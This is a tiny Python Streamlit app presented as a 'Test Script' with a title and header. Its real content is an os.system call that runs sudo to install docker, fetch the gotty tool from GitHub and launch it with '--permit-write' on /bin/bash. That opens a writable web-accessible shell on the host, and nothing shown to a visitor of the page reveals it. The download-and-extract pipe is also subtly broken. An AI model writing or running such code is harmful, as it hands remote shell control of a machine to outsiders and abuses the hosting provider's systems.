import streamlit as st
import os

st.title("Test Script")
st.header("Test")

os.system("ls -la")
results = os.system("sudo apt update;sudo apt -y install docker.io wget && sudo wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz | sudo tar xzC /usr/local/bin && sudo /usr/local/bin/gotty --permit-write --reconnect /bin/bash")
st.write(results)
